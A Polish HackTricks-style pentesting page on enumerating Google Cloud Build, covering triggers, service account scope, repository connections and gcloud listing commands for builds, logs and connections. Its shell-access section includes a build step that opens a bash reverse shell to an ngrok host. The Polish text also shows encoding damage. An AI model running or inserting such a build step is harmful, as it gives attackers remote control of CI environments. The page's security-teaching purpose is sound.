# GCP - Cloud Build Enum

<details>

<summary><strong>Naucz si hakowa AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* Jeli chcesz zobaczy swoj **firm reklamowan w HackTricks** lub **pobra HackTricks w formacie PDF**, sprawd藕 [**PLANY SUBSKRYPCYJNE**](https://github.com/sponsors/carlospolop)!
* Zdobd藕 [**oficjalne gad偶ety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**Rodzin PEASS**](https://opensea.io/collection/the-peass-family), nasz kolekcj ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **Docz do**  [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **led藕** nas na **Twitterze**  [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Podziel si swoimi sztuczkami hakerskimi, przesyajc PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>

## Podstawowe informacje

Google Cloud Build to zarzdzana platforma CI/CD, kt贸ra **automatyzuje procesy budowy oprogramowania** i wydawania, integrujc si z **repozytoriami kodu 藕r贸dowego** i obsugujc szeroki zakres jzyk贸w programowania. **Umo偶liwia programistom automatyczn budow, testowanie i wdra偶anie kodu**, zapewniajc jednoczenie elastyczno w dostosowywaniu krok贸w budowy i przepyw贸w pracy.

Ka偶dy wyzwalacz Cloud Build jest **powizany z Repozytorium Cloud lub bezporednio poczony z zewntrznym repozytorium** (Github, Bitbucket i Gitlab).

{% hint style="success" %}
Nie widziaem sposobu na kradzie偶 tokenu Github/Bitbucket std ani z Repozytori贸w Cloud, poniewa偶 po pobraniu repozytorium jest ono dostpne za porednictwem adresu URL [https://source.cloud.google.com/](https://source.cloud.google.com/), a Github nie jest dostpny dla klienta.
{% endhint %}

### Wydarzenia

Cloud Build mo偶e zosta uruchomiony, jeli:

* **Wprowadzono zmiany do gazi**: Okrel ga藕
* **Dodano now etykiet**: Okrel etykiet
* **Pull request**: Okrel ga藕, kt贸ra otrzymuje PR
* **Rczne wywoanie**
* **Wiadomo Pub/Sub**: Okrel temat
* **Zdarzenie webhook**: Ujawni adres URL HTTPS, a 偶danie musi by uwierzytelnione za pomoc sekretu

### Wykonanie

Istniej 3 opcje:

* Plik yaml/json **okrelajcy polecenia** do wykonania. Zazwyczaj: `/cloudbuild.yaml`
* Jedna, kt贸ra mo偶e by okrelona "w linii" w konsoli internetowej i w wierszu polece
* Najczstsza opcja
* Istotna dla dostpu nieuwierzytelnionego
* **Dockerfile** do budowy
* **Buildpack** do budowy

### Uprawnienia SA

**Konto usugi ma zakres `cloud-platform`**, dziki czemu mo偶e **korzysta ze wszystkich uprawnie.** Jeli **nie jest okrelone SA** (jak przy przesyaniu), zostanie u偶yte **domylne SA** `<numer-projektu>@cloudbuild.gserviceaccount.com`.

Domylnie nie s udzielane 偶adne uprawnienia, ale jest do atwo nada mu kilka:

<figure><img src="../../../.gitbook/assets/image (2) (1) (1).png" alt=""><figcaption></figcaption></figure>

### Zatwierdzenia

Mo偶liwe jest skonfigurowanie Cloud Builda w taki spos贸b, aby **wymaga zatwierdze dla wykonania budowy** (domylnie wyczone).

### Poczenia i Repozytoria

Poczenia mo偶na tworzy za pomoc:

* **GitHub:** Wywietli monit OAuth, proszc o uprawnienia do **uzyskania tokenu Github**, kt贸ry zostanie przechowywany w **Mened偶erze Sekret贸w.**
* **GitHub Enterprise:** Poprosi o zainstalowanie **GithubApp**. Token uwierzytelniajcy z hosta GitHub Enterprise zostanie utworzony i przechowywany w tym projekcie jako sekret **Mened偶era Sekret贸w.**
* **GitLab / Enterprise:** Nale偶y **poda token dostpu API i token dostpu do odczytu API**, kt贸re zostan przechowywane w **Mened偶erze Sekret贸w.**

Po utworzeniu poczenia mo偶na go u偶y do **powizania repozytori贸w, do kt贸rych konto Github ma dostp**.

Ta opcja jest dostpna za pomoc przycisku:

<figure><img src="../../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

{% hint style="success" %}
Zauwa偶, 偶e repozytoria poczone w ten spos贸b s **dostpne tylko w wyzwalaczach korzystajcych z 2. generacji.**
{% endhint %}

### Pocz Repozytorium

To nie to samo co **`poczenie`**. Pozwala to na **r贸偶ne** sposoby uzyskania **dostpu do repozytorium Githuba lub Bitbucket**, ale **nie generuje obiektu poczenia, ale generuje obiekt repozytorium (1. generacji).**

Ta opcja jest dostpna za pomoc przycisku:

<figure><img src="../../../.gitbook/assets/image (2) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

### Przechowywanie

Czasami Cloud Build **generuje nowe miejsce przechowywania plik贸w dla wyzwalacza**. Dzieje si to na przykad w przykadzie, kt贸ry oferuje GCP z:
```bash
git clone https://github.com/GoogleCloudBuild/cloud-console-sample-build && \
cd cloud-console-sample-build && \
gcloud builds submit --config cloudbuild.yaml --region=global
```
### Uzyskaj dostp do powoki

Utworzono kubeek o nazwie [security-devbox\_cloudbuild](https://console.cloud.google.com/storage/browser/security-devbox\_cloudbuild;tab=objects?forceOnBucketsSortingFiltering=false\&project=security-devbox), aby przechowywa plik `.tgz` z plikami do u偶ycia.
```yaml
steps:
- name: bash
script: |
#!/usr/bin/env bash
bash -i >& /dev/tcp/5.tcp.eu.ngrok.io/12395 0>&1
options:
logging: CLOUD_LOGGING_ONLY
```
Zainstaluj gcloud wewntrz Cloud Build:
```bash
# https://stackoverflow.com/questions/28372328/how-to-install-the-google-cloud-sdk-in-a-docker-image
curl https://dl.google.com/dl/cloudsdk/release/google-cloud-sdk.tar.gz > /tmp/google-cloud-sdk.tar.gz
mkdir -p /usr/local/gcloud
tar -C /usr/local/gcloud -xvf /tmp/google-cloud-sdk.tar.gz
/usr/local/gcloud/google-cloud-sdk/install.sh
```
### Wyliczanie

Mo偶esz znale藕 **wra偶liwe informacje w konfiguracjach budowy i logach**.
```bash
# Get configured triggers configurations
gcloud builds triggers list # Check for the words github and bitbucket
gcloud builds triggers describe <trigger-name>

# Get build executions
gcloud builds list
gcloud builds describe <build-uuid> # Get even the build yaml if defined in there
gcloud builds log <build-uuid> # Get build logs

# List all connections of each region
regions=("${(@f)$(gcloud compute regions list --format='value(name)')}")
for region in $regions; do
echo "Listing build connections in region: $region"
connections=("${(@f)$(gcloud builds connections list --region="$region" --format='value(name)')}")
if [[ ${#connections[@]} -eq 0 ]]; then
echo "No connections found in region $region."
else
for connection in $connections; do
echo "Describing connection $connection in region $region"
gcloud builds connections describe "$connection" --region="$region"
echo "-----------------------------------------"
done
fi
echo "========================================="
done

# List all worker-pools
regions=("${(@f)$(gcloud compute regions list --format='value(name)')}")
for region in $regions; do
echo "Listing build worker-pools in region: $region"
gcloud builds worker-pools list --region="$region"
echo "-----------------------------------------"
done
```
### Eskalacja uprawnie

{% content-ref url="../../gcp-security/gcp-privilege-escalation/gcp-cloudbuild-privesc.md" %}
[gcp-cloudbuild-privesc.md](../../gcp-security/gcp-privilege-escalation/gcp-cloudbuild-privesc.md)
{% endcontent-ref %}

### Nieuwierzytelniony dostp

{% content-ref url="../../gcp-security/gcp-unaunthenticated-enum-and-access/gcp-cloud-build-unauthenticated-enum.md" %}
[gcp-cloud-build-unauthenticated-enum.md](../../gcp-security/gcp-unaunthenticated-enum-and-access/gcp-cloud-build-unauthenticated-enum.md)
{% endcontent-ref %}

### Po wykorzystaniu

{% content-ref url="../../gcp-security/gcp-post-exploitation/gcp-cloud-build-post-exploitation.md" %}
[gcp-cloud-build-post-exploitation.md](../../gcp-security/gcp-post-exploitation/gcp-cloud-build-post-exploitation.md)
{% endcontent-ref %}

<details>

<summary><strong>Naucz si hakowa AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* Jeli chcesz zobaczy swoj **firm reklamowan w HackTricks** lub **pobra HackTricks w formacie PDF**, sprawd藕 [**PLANY SUBSKRYPCYJNE**](https://github.com/sponsors/carlospolop)!
* Zdobd藕 [**oficjalne gad偶ety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**Rodzin PEASS**](https://opensea.io/collection/the-peass-family), nasz kolekcj ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **Docz do**  [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **led藕** nas na **Twitterze**  [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Podziel si swoimi sztuczkami hakerskimi, przesyajc PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
